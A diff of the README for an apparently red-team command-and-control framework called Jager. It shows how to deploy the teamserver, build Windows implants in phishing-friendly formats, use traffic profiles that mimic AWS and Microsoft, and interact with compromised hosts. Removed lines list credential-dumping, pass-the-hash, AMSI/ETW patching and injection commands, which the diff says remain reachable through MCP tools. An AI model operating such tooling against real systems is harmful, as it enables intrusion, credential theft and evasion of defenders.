@@ -2,118 +2,102 @@
 
 ## Quick Start
 
-### 1. Deploy Infrastructure
+### 1. Deploy the teamserver
 
 ```bash
 # Docker (local/lab)
 cd deploy/
 docker-compose up -d
 
+# Or build manually
+cd teamserver && go build -o ../bin/jager-server ./cmd/jager-server
+./bin/jager-server --no-tls --db data/jager.db \
+  --grpc 0.0.0.0:31337 --mgmt 0.0.0.0:31338
+
 # Cloud (AWS)
 cd deploy/terraform/
 terraform init
-terraform apply -var="engagement_id=ENG-001" -var="domain=c2.example.com"
+terraform apply -var="engagement_id=ENG-001" -var="operator_ips=[\"1.2.3.4\"]" -var="domain=c2.example.com"
 ```
 
-### 2. Generate Operator Certificate
+The teamserver auto-generates a management API key at `data/api-key.txt` on
+first start. All `/mgmt/*` endpoints (except `/mgmt/ping`) require it via the
+`X-Jager-C2-Api-Key` header.
+
+### 2. Build the operator CLI
 
 ```bash
-jager admin cert-gen --name "operator1" --role operator --output ./certs/
+cd client/cli && go mod tidy && go build -o jager
+export JAGER_MGMT_URL=http://127.0.0.1:31338
+export JAGER_MGMT_API_KEY=$(cat data/api-key.txt)
 ```
 
-### 3. Create a Listener
+### 3. Create a listener
 
 ```bash
-jager listeners create \
-  --name "https-primary" \
-  --transport https \
-  --host 0.0.0.0 \
-  --port 443 \
-  --profile amazon
+jager listeners create --transport https --host 0.0.0.0 --port 443
+jager listeners list
 ```
 
-### 4. Build an Implant
+### 4. Build an implant
 
 ```bash
-jager build implant \
-  --listener https-primary \
-  --os windows \
-  --arch x64 \
-  --format exe \
-  --profile amazon \
-  --output ./builds/implant.exe
+jager build implant --os windows --arch x64 --format exe --output ./implant.exe
+# or the PowerShell helper (Windows):
+.\build-implant.ps1 -C2URL "https://your-server:443" -Sleep 60 -Jitter 20
 ```
 
-### 5. Deploy and Wait
+### 5. Deploy and wait
 
-Deploy the implant to the target. Once it calls back:
+Transfer the implant to the target. Once it calls back:
 
 ```bash
 jager sessions list
-# ID        Hostname    User          OS              Transport   Last Seen
-# sess-1    WORKSTA01   CORP\jsmith   Windows 10      HTTPS       2s ago
+# ID                                   HOSTNAME          USER
+# 6c1f...                              WORKSTA01         CORP\jsmith
 ```
 
 ### 6. Interact
 
 ```bash
-jager sessions interact sess-1
+jager sessions interact <session-id>
 ```
 
-## Session Commands
+Interactive commands: `shell <cmd>`, `ps`, `ls [path]`, `upload <l> <r>`,
+`download <r>`, `sleep <sec>`, `info`, `kill`, `back/exit`. Bare input is sent
+as a shell command.
+
+## CLI command reference
 
 | Command | Description |
 |---------|-------------|
-| `shell <cmd>` | Execute shell command |
-| `powershell <cmd>` | Execute PowerShell |
-| `upload <local> <remote>` | Upload file |
-| `download <remote>` | Download file |
-| `screenshot` | Take screenshot |
-| `sleep <sec> <jitter%>` | Change sleep/jitter |
-| `kill` | Terminate session |
+| `jager sessions list` | List active sessions |
+| `jager sessions interact <id>` | Interactive session REPL |
+| `jager sessions kill <id>` | Terminate a session |
+| `jager listeners list` | List active listeners |
+| `jager listeners create` | Start a listener (`--transport https/dns/smb/tcp --host --port`) |
+| `jager build implant` | Generate an implant (`--os --arch --format --profile --output`) |
+| `jager build list` | List previous builds |
+| `jager task shell <id> <cmd>` | Task a shell command |
+| `jager task upload <id> <l> <r>` | Upload a file |
+| `jager task download <id> <r>` | Download a file |
+| `jager campaign list` | List campaigns |
+| `jager creds list` | List stored credentials |
 
-## Credential Operations
+Command sets that are still CLI stubs (empty output) are marked on the project
+kanban board. Full capabilities for those domains are available today through
+the MCP tools (`cred_*`, `lateral_*`, `evasion_*`, `pivot_*`), which call the
+same management API.
 
-| Command | Description |
-|---------|-------------|
-| `cred dump-sam` | Dump SAM database |
-| `cred dump-lsa` | Dump LSA secrets |
-| `cred dump-lsass` | Dump LSASS memory |
-| `cred steal-token <pid>` | Steal process token |
-| `cred make-token <domain> <user> <pass>` | Create token |
-| `cred kerberoast` | Kerberoast SPNs |
+## Task types
 
-## Lateral Movement
+Tasking over the REST API uses the numeric `TaskType` enum from
+`teamserver/proto/tasks.proto` (e.g. 10 = shell, 11 = powershell, 20 = ls,
+24 = upload, 25 = download, 40 = ps, 63 = hashdump). The registry of all task
+IDs with handler and tool mappings is `capability-registry.yaml`. Validate sync
+with `python scripts/validate-c2-capabilities.py`.
 
-| Command | Description |
-|---------|-------------|
-| `lateral wmi <target> <cmd>` | WMI execution |
-| `lateral scm <target> <bin>` | Service deployment |
-| `lateral dcom <target> <cmd>` | DCOM execution |
-| `lateral schtask <target> <cmd>` | Scheduled task |
-| `lateral pth <target> <hash>` | Pass-the-hash |
-
-## Evasion
-
-| Command | Description |
-|---------|-------------|
-| `evasion patch-etw` | Patch ETW |
-| `evasion patch-amsi` | Patch AMSI |
-| `evasion unhook <dll>` | Unhook DLL |
-| `evasion inject <pid> <tech>` | Process injection |
-| `evasion sleep-mask` | Enable sleep encryption |
-
-## Pivot/Proxy
-
-| Command | Description |
-|---------|-------------|
-| `socks start <port>` | Start SOCKS5 proxy |
-| `socks stop` | Stop SOCKS5 |
-| `portfwd add <bind> <fwd>` | Add port forward |
-| `portfwd remove <id>` | Remove port forward |
-| `portfwd list` | List active forwards |
-
-## Payload Formats
+## Payload formats
 
 | Format | Use Case | Delivery |
 |--------|----------|----------|
@@ -125,6 +109,12 @@ jager sessions interact sess-1
 | `msi` | Windows Installer | Trusted format |
 | `cpl` | Control Panel | Double-click |
 | `xll` | Excel add-in | Attachment |
+| `iso`/`lnk` | Container/shortcut | Mount-and-click |
+| `powershell`/`csharp` | Scripted/.NET | Download cradles |
+
+`build_implant.py --format` accepts `exe`, `dll`, `shellcode`, `elf`; the
+remaining formats are generated by `builder/formats.py` through the format
+generator API and the build pipeline endpoint.
 
 ## IOC Profiles
 
@@ -134,26 +124,22 @@ Profiles control the network fingerprint of implant traffic:
 |---------|--------|----------|
 | `default` | Generic HTTPS | Testing |
 | `amazon` | AWS API calls | Cloud environments |
-| `microsoft` | Microsoft 365 traffic | Enterprise networks |
+| `microsoft-update` | Microsoft traffic | Enterprise networks |
 
-## Campaign Management
-
-```bash
-# Create campaign
-jager campaign create --name "Operation Thunder"
-
-# View timeline
-jager campaign timeline --id campaign-1
-
-# Get AI suggestions
-jager campaign suggest-next --id campaign-1
-```
+Same `(engagement_id, template, build_nonce)` always yields the same URIs,
+transforms, pipes, and mutexes. Never reuse builds across engagements.
 
 ## OPSEC Guidelines
 
-1. **Always use jitter** - Never use 0% jitter in production
-2. **Kill date** - Always set a kill date for engagements
-3. **Profile selection** - Match C2 traffic to target environment
-4. **Sleep time** - Production minimum: 30 seconds
-5. **Cleanup** - Check `se --journal show` before engagement end
-6. **Redirectors** - Never expose teamserver directly
+1. **Always use jitter** - never 0% jitter in production
+2. **Kill date** - always set a kill date for engagements
+3. **Profile selection** - match C2 traffic to the target environment
+4. **Sleep time** - production minimum: 30 seconds
+5. **API keys** - rotate after operator turnover; never commit them
+6. **Redirectors** - never expose the teamserver directly; use the generated nginx redirector configs
+
+## Troubleshooting
+
+- **Implant not calling back?** Verify the C2 URL matches a running listener; check `docker logs jager-teamserver`
+- **401/403 on management API?** Export `JAGER_MGMT_API_KEY` from `data/api-key.txt`
+- **Task timeout?** Default sleep is 60s; `/mgmt/task/wait` polls up to 120s
